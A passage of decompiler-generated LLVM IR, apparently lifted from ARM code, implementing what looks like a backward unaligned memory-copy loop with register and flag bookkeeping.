  store i1 %v8_fd94, i1* %cpsr_n.global-to-local, align 1
  %v1_fd98 = add i32 %v2_fcdc, -1
  %v2_fd98 = inttoptr i32 %v1_fd98 to i8*
  %v3_fd98 = load i8, i8* %v2_fd98, align 1
  %v4_fd98 = zext i8 %v3_fd98 to i32
  store i32 %v4_fd98, i32* @r3, align 4
  store i32 %v1_fd98, i32* @r1, align 4
  %v3_fd9c = add i32 %v2_fce0, -1
  %v4_fd9c = inttoptr i32 %v3_fd9c to i8*
  store i8 %v3_fd98, i8* %v4_fd9c, align 1
  %v5_fd9c = load i32, i32* %r0.global-to-local, align 4
  %v6_fd9c = add i32 %v5_fd9c, -1
  store i32 %v6_fd9c, i32* %r0.global-to-local, align 4
  br i1 %v8_fd94, label %.thread25, label %bb146

bb146:                                            ; preds = %dec_label_pc_fd94
  %v9_fd94 = icmp eq i32 %v1_fcec, 2
  %v6_fda0 = load i32, i32* @r1, align 4
  %v7_fda0 = add i32 %v6_fda0, -1
  %v8_fda0 = inttoptr i32 %v7_fda0 to i8*
  %v9_fda0 = load i8, i8* %v8_fda0, align 1
  %v10_fda0 = zext i8 %v9_fda0 to i32
  store i32 %v10_fda0, i32* @r3, align 4
  store i32 %v7_fda0, i32* @r1, align 4
  %v9_fda4 = add i32 %v5_fd9c, -2
  %v10_fda4 = inttoptr i32 %v9_fda4 to i8*
  store i8 %v9_fda0, i8* %v10_fda4, align 1
  %v11_fda4 = load i32, i32* %r0.global-to-local, align 4
  %v12_fda4 = add i32 %v11_fda4, -1
  store i32 %v12_fda4, i32* %r0.global-to-local, align 4
  br i1 %v9_fd94, label %.thread25, label %bb147

bb147:                                            ; preds = %bb146
  %v8_fda8 = load i32, i32* @r1, align 4
  %v9_fda8 = add i32 %v8_fda8, -1
  %v10_fda8 = inttoptr i32 %v9_fda8 to i8*
  %v11_fda8 = load i8, i8* %v10_fda8, align 1
  %v12_fda8 = zext i8 %v11_fda8 to i32
  store i32 %v12_fda8, i32* @r3, align 4
  store i32 %v9_fda8, i32* @r1, align 4
  %v11_fdac = add i32 %v11_fda4, -2
  %v12_fdac = inttoptr i32 %v11_fdac to i8*
  store i8 %v11_fda8, i8* %v12_fdac, align 1
  %v13_fdac = load i32, i32* %r0.global-to-local, align 4
  %v14_fdac = add i32 %v13_fdac, -1
  store i32 %v14_fdac, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb146, %dec_label_pc_fd94, %bb147
  %v0_fe0831 = phi i32 [ %v12_fda4, %bb146 ], [ %v6_fd9c, %dec_label_pc_fd94 ], [ %v14_fdac, %bb147 ]
  %v0_fdb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_fdb0 = load i32, i32* @ip, align 4
  %v2_fdb0 = sub i32 %v0_fdb0, %v1_fdb0
  store i32 %v2_fdb0, i32* %r2.global-to-local, align 4
  %v4_fdb0 = xor i32 %v1_fdb0, %v0_fdb0
  %v5_fdb0 = xor i32 %v2_fdb0, %v0_fdb0
  %v6_fdb0 = and i32 %v5_fdb0, %v4_fdb0
  %v7_fdb0 = icmp slt i32 %v6_fdb0, 0
  store i1 %v7_fdb0, i1* %cpsr_v.global-to-local, align 1
  %v8_fdb0 = icmp slt i32 %v2_fdb0, 0
  store i1 %v8_fdb0, i1* %cpsr_n.global-to-local, align 1
  %v5_fdb4 = icmp slt i32 %v0_fdb0, %v1_fdb0
  br i1 %v5_fdb4, label %bb142, label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %.thread25
  %v0_fdb8 = load i32, i32* @r1, align 4
  %v1_fdb8 = urem i32 %v0_fdb8, 4
  store i32 %v1_fdb8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fdb8 = icmp eq i32 %v1_fdb8, 0
  br i1 %v2_fdb8, label %dec_label_pc_fcfc, label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fcf4, %dec_label_pc_fdb8
  %v0_fe0830 = phi i32 [ %v2_fce0, %dec_label_pc_fcf4 ], [ %v0_fe0831, %dec_label_pc_fdb8 ]
  %v0_feb4 = phi i32 [ %v2_fce4, %dec_label_pc_fcf4 ], [ %v2_fdb0, %dec_label_pc_fdb8 ]
  %v0_fdc0 = phi i32 [ %v2_fcdc, %dec_label_pc_fcf4 ], [ %v0_fdb8, %dec_label_pc_fdb8 ]
  %v0_fdc8 = phi i32 [ %v1_fcf4, %dec_label_pc_fcf4 ], [ %v1_fdb8, %dec_label_pc_fdb8 ]
  %v1_fdc0 = and i32 %v0_fdc0, -4
  store i32 %v1_fdc0, i32* %r1.global-to-local, align 4
  %v1_fdc4 = inttoptr i32 %v1_fdc0 to i32*
  %v2_fdc4 = load i32, i32* %v1_fdc4, align 4
  store i32 %v2_fdc4, i32* @r3, align 4
  %v7_fdc8 = icmp ult i32 %v0_fdc8, 2
  %v2_feac = add i32 %v0_feb4, -12
  %v4_feac = sub i32 11, %v0_feb4
  %v5_feac = and i32 %v4_feac, %v0_feb4
  %v6_feac = icmp slt i32 %v5_feac, 0
  store i1 %v6_feac, i1* %cpsr_v.global-to-local, align 1
  %v7_feac = icmp slt i32 %v2_feac, 0
  store i1 %v7_feac, i1* %cpsr_n.global-to-local, align 1
  %v5_feb0 = icmp slt i32 %v0_feb4, 12
  br i1 %v7_fdc8, label %dec_label_pc_feac, label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fdc0
  %v8_fdc8 = icmp eq i32 %v0_fdc8, 2
  br i1 %v8_fdc8, label %dec_label_pc_fe40, label %dec_label_pc_fdd4

dec_label_pc_fdd4:                                ; preds = %dec_label_pc_fdd0
  br i1 %v5_feb0, label %dec_label_pc_fe20, label %dec_label_pc_fddc

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fdd4
  store i32 %v2_feac, i32* %r2.global-to-local, align 4
  %v3_fde0 = load i32, i32* @r4, align 4
  store i32 %v3_fde0, i32* %stack_var_-12, align 4
  %v6_fde0 = load i32, i32* @r5, align 4
  %v8_fde0 = inttoptr i32 %v6_fde0 to i8*
  store i8* %v8_fde0, i8** %stack_var_-8, align 4
  %v11_fde0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge, %dec_label_pc_fddc
  %v0_fe08 = phi i32 [ %v1_fe08, %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge ], [ %v0_fe0830, %dec_label_pc_fddc ]
  %v0_fde8 = phi i32 [ %v0_fde8.pre, %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge ], [ %v1_fdc0, %dec_label_pc_fddc ]
  %v0_fde4 = phi i32 [ %v0_fde4.pre, %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge ], [ %v2_fdc4, %dec_label_pc_fddc ]
  %v3_fde4 = mul i32 %v0_fde4, 256
  store i32 %v3_fde4, i32* %lr.global-to-local, align 4
  %v1_fde8 = add i32 %v0_fde8, -4
  %v2_fde8 = inttoptr i32 %v1_fde8 to i32*
  %v3_fde8 = load i32, i32* %v2_fde8, align 4
  store i32 %v3_fde8, i32* @r3, align 4
  %v4_fde8 = add i32 %v0_fde8, -8
  %v5_fde8 = inttoptr i32 %v4_fde8 to i32*
  %v6_fde8 = load i32, i32* %v5_fde8, align 4
  store i32 %v6_fde8, i32* %r4.global-to-local, align 4
  %v7_fde8 = add i32 %v0_fde8, -12
  %v8_fde8 = inttoptr i32 %v7_fde8 to i32*
  %v9_fde8 = load i32, i32* %v8_fde8, align 4
  store i32 %v9_fde8, i32* %r5.global-to-local, align 4
  %v10_fde8 = add i32 %v0_fde8, -16
  %v11_fde8 = inttoptr i32 %v10_fde8 to i32*
  %v12_fde8 = load i32, i32* %v11_fde8, align 4
  store i32 %v10_fde8, i32* %r1.global-to-local, align 4
  %v4_fdec = udiv i32 %v12_fde8, 16777216
  %v5_fdec = or i32 %v4_fdec, %v3_fde4
  store i32 %v5_fdec, i32* %lr.global-to-local, align 4
  %v3_fdf0 = mul i32 %v12_fde8, 256
  %v4_fdf4 = udiv i32 %v9_fde8, 16777216
  %v5_fdf4 = or i32 %v3_fdf0, %v4_fdf4
  store i32 %v5_fdf4, i32* @ip, align 4
  %v3_fdf8 = mul i32 %v9_fde8, 256
  %v4_fdfc = udiv i32 %v6_fde8, 16777216
  %v5_fdfc = or i32 %v3_fdf8, %v4_fdfc
  store i32 %v5_fdfc, i32* %r5.global-to-local, align 4
  %v3_fe00 = mul i32 %v6_fde8, 256
  %v4_fe04 = udiv i32 %v3_fde8, 16777216
  %v5_fe04 = or i32 %v3_fe00, %v4_fe04
  store i32 %v5_fe04, i32* %r4.global-to-local, align 4
  %v1_fe08 = add i32 %v0_fe08, -16
  %v2_fe08 = inttoptr i32 %v1_fe08 to i32*
  store i32 %v5_fe04, i32* %v2_fe08, align 4
  %v4_fe08 = add i32 %v0_fe08, -12
  %v5_fe08 = inttoptr i32 %v4_fe08 to i32*
  %v6_fe08 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_fe08, i32* %v5_fe08, align 4
  %v7_fe08 = add i32 %v0_fe08, -8
  %v8_fe08 = inttoptr i32 %v7_fe08 to i32*
  %v9_fe08 = load i32, i32* @ip, align 4
  store i32 %v9_fe08, i32* %v8_fe08, align 4
  %v10_fe08 = add i32 %v0_fe08, -4
  %v11_fe08 = inttoptr i32 %v10_fe08 to i32*
  %v12_fe08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_fe08, i32* %v11_fe08, align 4
  store i32 %v1_fe08, i32* %r0.global-to-local, align 4
  %v0_fe0c = load i32, i32* %r2.global-to-local, align 4
  %v2_fe0c = add i32 %v0_fe0c, -16
  store i32 %v2_fe0c, i32* %r2.global-to-local, align 4
  %v6_fe10 = icmp slt i32 %v0_fe0c, 16
  br i1 %v6_fe10, label %dec_label_pc_fe14, label %dec_label_pc_fde4.dec_label_pc_fde4_crit_edge

dec_label_pc_fde4.dec_label_pc_fde4_crit_edge:    ; preds = %dec_label_pc_fde4
  %v0_fde4.pre = load i32, i32* @r3, align 4
  %v0_fde8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fde4

dec_label_pc_fe14:                                ; preds = %dec_label_pc_fde4
  %v2_fe14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fe14, i32* @r4, align 4
  %v5_fe14 = load i8*, i8** %stack_var_-8, align 4
  %v6_fe14 = ptrtoint i8* %v5_fe14 to i32
  store i32 %v6_fe14, i32* @r5, align 4
  store i32 %v11_fde0, i32* @lr, align 4
  %v2_fe18 = add i32 %v0_fe0c, -4
  store i32 %v2_fe18, i32* %r2.global-to-local, align 4
  %v4_fe18 = add i32 %v0_fe0c, 2147483632
  %v5_fe18 = and i32 %v2_fe18, %v4_fe18
  %v6_fe18 = icmp slt i32 %v5_fe18, 0
  store i1 %v6_fe18, i1* %cpsr_v.global-to-local, align 1
  %v7_fe18 = icmp slt i32 %v2_fe18, 0
  store i1 %v7_fe18, i1* %cpsr_n.global-to-local, align 1
  %v5_fe1c = icmp slt i32 %v2_fe0c, -12
  br i1 %v5_fe1c, label %dec_label_pc_fe38, label %dec_label_pc_fe20

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fe14, %dec_label_pc_fdd4, %dec_label_pc_fe20
  %v1_fe2c = phi i32 [ %v5_fe2c, %dec_label_pc_fe20 ], [ %v1_fe08, %dec_label_pc_fe14 ], [ %v0_fe0830, %dec_label_pc_fdd4 ]
  %v0_fe20 = load i32, i32* @r3, align 4
  %v3_fe20 = mul i32 %v0_fe20, 256
  store i32 %v3_fe20, i32* %ip.global-to-local, align 4
  %v0_fe24 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe24 = add i32 %v0_fe24, -4
  %v2_fe24 = inttoptr i32 %v1_fe24 to i32*
  %v3_fe24 = load i32, i32* %v2_fe24, align 4
  store i32 %v3_fe24, i32* @r3, align 4
  store i32 %v1_fe24, i32* %r1.global-to-local, align 4
  %v4_fe28 = udiv i32 %v3_fe24, 16777216
  %v5_fe28 = or i32 %v4_fe28, %v3_fe20
  store i32 %v5_fe28, i32* @ip, align 4
  %v2_fe2c = add i32 %v1_fe2c, -4
  %v3_fe2c = inttoptr i32 %v2_fe2c to i32*
  store i32 %v5_fe28, i32* %v3_fe2c, align 4
  %v4_fe2c = load i32, i32* %r0.global-to-local, align 4
  %v5_fe2c = add i32 %v4_fe2c, -4
  store i32 %v5_fe2c, i32* %r0.global-to-local, align 4
  %v0_fe30 = load i32, i32* %r2.global-to-local, align 4
  %v2_fe30 = add i32 %v0_fe30, -4
  store i32 %v2_fe30, i32* %r2.global-to-local, align 4
  %v6_fe34 = icmp slt i32 %v0_fe30, 4
  br i1 %v6_fe34, label %dec_label_pc_fe38.loopexit, label %dec_label_pc_fe20

dec_label_pc_fe38.loopexit:                       ; preds = %dec_label_pc_fe20
  %v4_fe30 = sub i32 3, %v0_fe30
  %v5_fe30 = and i32 %v4_fe30, %v0_fe30
  %v6_fe30 = icmp slt i32 %v5_fe30, 0
  %v7_fe30 = icmp slt i32 %v2_fe30, 0
  store i1 %v6_fe30, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fe30, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fe38

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe38.loopexit, %dec_label_pc_fe14
  %v2_fd7c62 = phi i32 [ %v5_fe2c, %dec_label_pc_fe38.loopexit ], [ %v1_fe08, %dec_label_pc_fe14 ]
  %v0_fd6c58 = phi i32 [ %v2_fe30, %dec_label_pc_fe38.loopexit ], [ %v2_fe18, %dec_label_pc_fe14 ]
  %v0_fe38 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe38 = add i32 %v0_fe38, 3
  store i32 %v1_fe38, i32* @r1, align 4
  br label %bb142

dec_label_pc_fe40:                                ; preds = %dec_label_pc_fdd0
  br i1 %v5_feb0, label %dec_label_pc_fe8c, label %dec_label_pc_fe48

dec_label_pc_fe48:                                ; preds = %dec_label_pc_fe40
  store i32 %v2_feac, i32* %r2.global-to-local, align 4
  %v3_fe4c = load i32, i32* @r4, align 4
  store i32 %v3_fe4c, i32* %stack_var_-12, align 4
  %v6_fe4c = load i32, i32* @r5, align 4
  %v8_fe4c = inttoptr i32 %v6_fe4c to i8*
  store i8* %v8_fe4c, i8** %stack_var_-8, align 4
  %v11_fe4c = load i32, i32* @lr, align 4
  br label %dec_label_pc_fe50

dec_label_pc_fe50:                                ; preds = %dec_label_pc_fe50.dec_label_pc_fe50_crit_edge, %dec_label_pc_fe48
  %v0_fe74 = phi i32 [ %v1_fe74, %dec_label_pc_fe50.dec_label_pc_fe50_crit_edge ], [ %v0_fe0830, %dec_label_pc_fe48 ]
  %v0_fe54 = phi i32 [ %v0_fe54.pre, %dec_label_pc_fe50.dec_label_pc_fe50_crit_edge ], [ %v1_fdc0, %dec_label_pc_fe48 ]
  %v0_fe50 = phi i32 [ %v0_fe50.pre, %dec_label_pc_fe50.dec_label_pc_fe50_crit_edge ], [ %v2_fdc4, %dec_label_pc_fe48 ]
  %v3_fe50 = mul i32 %v0_fe50, 65536
  store i32 %v3_fe50, i32* %lr.global-to-local, align 4
  %v1_fe54 = add i32 %v0_fe54, -4
  %v2_fe54 = inttoptr i32 %v1_fe54 to i32*
  %v3_fe54 = load i32, i32* %v2_fe54, align 4
  store i32 %v3_fe54, i32* @r3, align 4
  %v4_fe54 = add i32 %v0_fe54, -8
  %v5_fe54 = inttoptr i32 %v4_fe54 to i32*
  %v6_fe54 = load i32, i32* %v5_fe54, align 4
  store i32 %v6_fe54, i32* %r4.global-to-local, align 4
  %v7_fe54 = add i32 %v0_fe54, -12
  %v8_fe54 = inttoptr i32 %v7_fe54 to i32*
  %v9_fe54 = load i32, i32* %v8_fe54, align 4
  store i32 %v9_fe54, i32* %r5.global-to-local, align 4
  %v10_fe54 = add i32 %v0_fe54, -16
  %v11_fe54 = inttoptr i32 %v10_fe54 to i32*
  %v12_fe54 = load i32, i32* %v11_fe54, align 4
  store i32 %v10_fe54, i32* %r1.global-to-local, align 4
  %v4_fe58 = udiv i32 %v12_fe54, 65536
  %v5_fe58 = or i32 %v4_fe58, %v3_fe50
  store i32 %v5_fe58, i32* %lr.global-to-local, align 4
  %v3_fe5c = mul i32 %v12_fe54, 65536
  %v4_fe60 = udiv i32 %v9_fe54, 65536
  %v5_fe60 = or i32 %v3_fe5c, %v4_fe60
  store i32 %v5_fe60, i32* @ip, align 4
  %v3_fe64 = mul i32 %v9_fe54, 65536
  %v4_fe68 = udiv i32 %v6_fe54, 65536
  %v5_fe68 = or i32 %v3_fe64, %v4_fe68
  store i32 %v5_fe68, i32* %r5.global-to-local, align 4
  %v3_fe6c = mul i32 %v6_fe54, 65536
  %v4_fe70 = udiv i32 %v3_fe54, 65536
  %v5_fe70 = or i32 %v3_fe6c, %v4_fe70
  store i32 %v5_fe70, i32* %r4.global-to-local, align 4
  %v1_fe74 = add i32 %v0_fe74, -16
  %v2_fe74 = inttoptr i32 %v1_fe74 to i32*
  store i32 %v5_fe70, i32* %v2_fe74, align 4
  %v4_fe74 = add i32 %v0_fe74, -12
  %v5_fe74 = inttoptr i32 %v4_fe74 to i32*
  %v6_fe74 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_fe74, i32* %v5_fe74, align 4
  %v7_fe74 = add i32 %v0_fe74, -8
  %v8_fe74 = inttoptr i32 %v7_fe74 to i32*
  %v9_fe74 = load i32, i32* @ip, align 4
  store i32 %v9_fe74, i32* %v8_fe74, align 4
  %v10_fe74 = add i32 %v0_fe74, -4
  %v11_fe74 = inttoptr i32 %v10_fe74 to i32*
  %v12_fe74 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_fe74, i32* %v11_fe74, align 4
  store i32 %v1_fe74, i32* %r0.global-to-local, align 4
  %v0_fe78 = load i32, i32* %r2.global-to-local, align 4
  %v2_fe78 = add i32 %v0_fe78, -16
  store i32 %v2_fe78, i32* %r2.global-to-local, align 4
  %v6_fe7c = icmp slt i32 %v0_fe78, 16
  br i1 %v6_fe7c, label %dec_label_pc_fe80, label %dec_label_pc_fe50.dec_label_pc_fe50_crit_edge

dec_label_pc_fe50.dec_label_pc_fe50_crit_edge:    ; preds = %dec_label_pc_fe50
  %v0_fe50.pre = load i32, i32* @r3, align 4
  %v0_fe54.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fe50

dec_label_pc_fe80:                                ; preds = %dec_label_pc_fe50
  %v2_fe80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fe80, i32* @r4, align 4
  %v5_fe80 = load i8*, i8** %stack_var_-8, align 4
  %v6_fe80 = ptrtoint i8* %v5_fe80 to i32
  store i32 %v6_fe80, i32* @r5, align 4
  store i32 %v11_fe4c, i32* @lr, align 4
  %v2_fe84 = add i32 %v0_fe78, -4
  store i32 %v2_fe84, i32* %r2.global-to-local, align 4
  %v4_fe84 = add i32 %v0_fe78, 2147483632
  %v5_fe84 = and i32 %v2_fe84, %v4_fe84
  %v6_fe84 = icmp slt i32 %v5_fe84, 0
  store i1 %v6_fe84, i1* %cpsr_v.global-to-local, align 1
  %v7_fe84 = icmp slt i32 %v2_fe84, 0
  store i1 %v7_fe84, i1* %cpsr_n.global-to-local, align 1
  %v5_fe88 = icmp slt i32 %v2_fe78, -12
  br i1 %v5_fe88, label %dec_label_pc_fea4, label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe80, %dec_label_pc_fe40, %dec_label_pc_fe8c
  %v1_fe98 = phi i32 [ %v5_fe98, %dec_label_pc_fe8c ], [ %v1_fe74, %dec_label_pc_fe80 ], [ %v0_fe0830, %dec_label_pc_fe40 ]
  %v0_fe8c = load i32, i32* @r3, align 4
  %v3_fe8c = mul i32 %v0_fe8c, 65536
  store i32 %v3_fe8c, i32* %ip.global-to-local, align 4
  %v0_fe90 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe90 = add i32 %v0_fe90, -4
  %v2_fe90 = inttoptr i32 %v1_fe90 to i32*
  %v3_fe90 = load i32, i32* %v2_fe90, align 4
  store i32 %v3_fe90, i32* @r3, align 4
  store i32 %v1_fe90, i32* %r1.global-to-local, align 4
  %v4_fe94 = udiv i32 %v3_fe90, 65536
  %v5_fe94 = or i32 %v4_fe94, %v3_fe8c
  store i32 %v5_fe94, i32* @ip, align 4
  %v2_fe98 = add i32 %v1_fe98, -4
  %v3_fe98 = inttoptr i32 %v2_fe98 to i32*
  store i32 %v5_fe94, i32* %v3_fe98, align 4
  %v4_fe98 = load i32, i32* %r0.global-to-local, align 4
  %v5_fe98 = add i32 %v4_fe98, -4
  store i32 %v5_fe98, i32* %r0.global-to-local, align 4
  %v0_fe9c = load i32, i32* %r2.global-to-local, align 4
  %v2_fe9c = add i32 %v0_fe9c, -4
  store i32 %v2_fe9c, i32* %r2.global-to-local, align 4
  %v6_fea0 = icmp slt i32 %v0_fe9c, 4
  br i1 %v6_fea0, label %dec_label_pc_fea4.loopexit, label %dec_label_pc_fe8c

dec_label_pc_fea4.loopexit:                       ; preds = %dec_label_pc_fe8c
  %v4_fe9c = sub i32 3, %v0_fe9c
  %v5_fe9c = and i32 %v4_fe9c, %v0_fe9c
  %v6_fe9c = icmp slt i32 %v5_fe9c, 0
  %v7_fe9c = icmp slt i32 %v2_fe9c, 0
  store i1 %v6_fe9c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_fe9c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_fea4

dec_label_pc_fea4:                                ; preds = %dec_label_pc_fea4.loopexit, %dec_label_pc_fe80
  %v2_fd7c63 = phi i32 [ %v5_fe98, %dec_label_pc_fea4.loopexit ], [ %v1_fe74, %dec_label_pc_fe80 ]
  %v0_fd6c59 = phi i32 [ %v2_fe9c, %dec_label_pc_fea4.loopexit ], [ %v2_fe84, %dec_label_pc_fe80 ]
  %v0_fea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_fea4 = add i32 %v0_fea4, 2
  store i32 %v1_fea4, i32* @r1, align 4
  br label %bb142

dec_label_pc_feac:                                ; preds = %dec_label_pc_fdc0
  br i1 %v5_feb0, label %dec_label_pc_fef8, label %dec_label_pc_feb4

dec_label_pc_feb4:                                ; preds = %dec_label_pc_feac
  store i32 %v2_feac, i32* %r2.global-to-local, align 4
  %v3_feb8 = load i32, i32* @r4, align 4
  store i32 %v3_feb8, i32* %stack_var_-12, align 4
  %v6_feb8 = load i32, i32* @r5, align 4
  %v8_feb8 = inttoptr i32 %v6_feb8 to i8*
  store i8* %v8_feb8, i8** %stack_var_-8, align 4
  %v11_feb8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_febc

dec_label_pc_febc:                                ; preds = %dec_label_pc_febc.dec_label_pc_febc_crit_edge, %dec_label_pc_feb4
  %v0_fee0 = phi i32 [ %v1_fee0, %dec_label_pc_febc.dec_label_pc_febc_crit_edge ], [ %v0_fe0830, %dec_label_pc_feb4 ]
  %v0_fec0 = phi i32 [ %v0_fec0.pre, %dec_label_pc_febc.dec_label_pc_febc_crit_edge ], [ %v1_fdc0, %dec_label_pc_feb4 ]
  %v0_febc = phi i32 [ %v0_febc.pre, %dec_label_pc_febc.dec_label_pc_febc_crit_edge ], [ %v2_fdc4, %dec_label_pc_feb4 ]
  %v3_febc = mul i32 %v0_febc, 16777216
  store i32 %v3_febc, i32* %lr.global-to-local, align 4
  %v1_fec0 = add i32 %v0_fec0, -4
  %v2_fec0 = inttoptr i32 %v1_fec0 to i32*
  %v3_fec0 = load i32, i32* %v2_fec0, align 4
  store i32 %v3_fec0, i32* @r3, align 4
  %v4_fec0 = add i32 %v0_fec0, -8
  %v5_fec0 = inttoptr i32 %v4_fec0 to i32*
  %v6_fec0 = load i32, i32* %v5_fec0, align 4
  store i32 %v6_fec0, i32* %r4.global-to-local, align 4
  %v7_fec0 = add i32 %v0_fec0, -12
  %v8_fec0 = inttoptr i32 %v7_fec0 to i32*
  %v9_fec0 = load i32, i32* %v8_fec0, align 4
  store i32 %v9_fec0, i32* %r5.global-to-local, align 4
  %v10_fec0 = add i32 %v0_fec0, -16
  %v11_fec0 = inttoptr i32 %v10_fec0 to i32*
  %v12_fec0 = load i32, i32* %v11_fec0, align 4
  store i32 %v10_fec0, i32* %r1.global-to-local, align 4
  %v4_fec4 = udiv i32 %v12_fec0, 256
  %v5_fec4 = or i32 %v4_fec4, %v3_febc
  store i32 %v5_fec4, i32* %lr.global-to-local, align 4
  %v3_fec8 = mul i32 %v12_fec0, 16777216
  %v4_fecc = udiv i32 %v9_fec0, 256
  %v5_fecc = or i32 %v3_fec8, %v4_fecc
  store i32 %v5_fecc, i32* @ip, align 4
  %v3_fed0 = mul i32 %v9_fec0, 16777216
  %v4_fed4 = udiv i32 %v6_fec0, 256
  %v5_fed4 = or i32 %v3_fed0, %v4_fed4
  store i32 %v5_fed4, i32* %r5.global-to-local, align 4
  %v3_fed8 = mul i32 %v6_fec0, 16777216
  %v4_fedc = udiv i32 %v3_fec0, 256
  %v5_fedc = or i32 %v3_fed8, %v4_fedc
  store i32 %v5_fedc, i32* %r4.global-to-local, align 4
  %v1_fee0 = add i32 %v0_fee0, -16
  %v2_fee0 = inttoptr i32 %v1_fee0 to i32*
  store i32 %v5_fedc, i32* %v2_fee0, align 4
  %v4_fee0 = add i32 %v0_fee0, -12
  %v5_fee0 = inttoptr i32 %v4_fee0 to i32*
  %v6_fee0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_fee0, i32* %v5_fee0, align 4
  %v7_fee0 = add i32 %v0_fee0, -8
  %v8_fee0 = inttoptr i32 %v7_fee0 to i32*
  %v9_fee0 = load i32, i32* @ip, align 4
  store i32 %v9_fee0, i32* %v8_fee0, align 4
  %v10_fee0 = add i32 %v0_fee0, -4
  %v11_fee0 = inttoptr i32 %v10_fee0 to i32*
  %v12_fee0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_fee0, i32* %v11_fee0, align 4
  store i32 %v1_fee0, i32* %r0.global-to-local, align 4
  %v0_fee4 = load i32, i32* %r2.global-to-local, align 4
  %v2_fee4 = add i32 %v0_fee4, -16
  store i32 %v2_fee4, i32* %r2.global-to-local, align 4
  %v6_fee8 = icmp slt i32 %v0_fee4, 16
  br i1 %v6_fee8, label %dec_label_pc_feec, label %dec_label_pc_febc.dec_label_pc_febc_crit_edge

dec_label_pc_febc.dec_label_pc_febc_crit_edge:    ; preds = %dec_label_pc_febc
  %v0_febc.pre = load i32, i32* @r3, align 4
  %v0_fec0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_febc

dec_label_pc_feec:                                ; preds = %dec_label_pc_febc
  %v2_feec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_feec, i32* @r4, align 4
  %v5_feec = load i8*, i8** %stack_var_-8, align 4
  %v6_feec = ptrtoint i8* %v5_feec to i32
  store i32 %v6_feec, i32* @r5, align 4
  store i32 %v11_feb8, i32* @lr, align 4
  %v2_fef0 = add i32 %v0_fee4, -4
  store i32 %v2_fef0, i32* %r2.global-to-local, align 4
  %v4_fef0 = add i32 %v0_fee4, 2147483632
  %v5_fef0 = and i32 %v2_fef0, %v4_fef0
  %v6_fef0 = icmp slt i32 %v5_fef0, 0
  store i1 %v6_fef0, i1* %cpsr_v.global-to-local, align 1
  %v7_fef0 = icmp slt i32 %v2_fef0, 0
  store i1 %v7_fef0, i1* %cpsr_n.global-to-local, align 1
  %v5_fef4 = icmp slt i32 %v2_fee4, -12
  br i1 %v5_fef4, label %dec_label_pc_ff10, label %dec_label_pc_fef8

dec_label_pc_fef8:                                ; preds = %dec_label_pc_feec, %dec_label_pc_feac, %dec_label_pc_fef8
  %v1_ff04 = phi i32 [ %v5_ff04, %dec_label_pc_fef8 ], [ %v1_fee0, %dec_label_pc_feec ], [ %v0_fe0830, %dec_label_pc_feac ]
  %v0_fef8 = load i32, i32* @r3, align 4
  %v3_fef8 = mul i32 %v0_fef8, 16777216
  store i32 %v3_fef8, i32* %ip.global-to-local, align 4
  %v0_fefc = load i32, i32* %r1.global-to-local, align 4
  %v1_fefc = add i32 %v0_fefc, -4
  %v2_fefc = inttoptr i32 %v1_fefc to i32*
  %v3_fefc = load i32, i32* %v2_fefc, align 4
  store i32 %v3_fefc, i32* @r3, align 4
  store i32 %v1_fefc, i32* %r1.global-to-local, align 4
  %v4_ff00 = udiv i32 %v3_fefc, 256
  %v5_ff00 = or i32 %v4_ff00, %v3_fef8
  store i32 %v5_ff00, i32* @ip, align 4
  %v2_ff04 = add i32 %v1_ff04, -4
  %v3_ff04 = inttoptr i32 %v2_ff04 to i32*
  store i32 %v5_ff00, i32* %v3_ff04, align 4
  %v4_ff04 = load i32, i32* %r0.global-to-local, align 4
  %v5_ff04 = add i32 %v4_ff04, -4
  store i32 %v5_ff04, i32* %r0.global-to-local, align 4
  %v0_ff08 = load i32, i32* %r2.global-to-local, align 4
  %v2_ff08 = add i32 %v0_ff08, -4
  store i32 %v2_ff08, i32* %r2.global-to-local, align 4
  %v6_ff0c = icmp slt i32 %v0_ff08, 4
  br i1 %v6_ff0c, label %dec_label_pc_ff10.loopexit, label %dec_label_pc_fef8

dec_label_pc_ff10.loopexit:                       ; preds = %dec_label_pc_fef8
  %v4_ff08 = sub i32 3, %v0_ff08
  %v5_ff08 = and i32 %v4_ff08, %v0_ff08
  %v6_ff08 = icmp slt i32 %v5_ff08, 0
  %v7_ff08 = icmp slt i32 %v2_ff08, 0
  store i1 %v6_ff08, i1* %cpsr_v.global-to-local, align 1
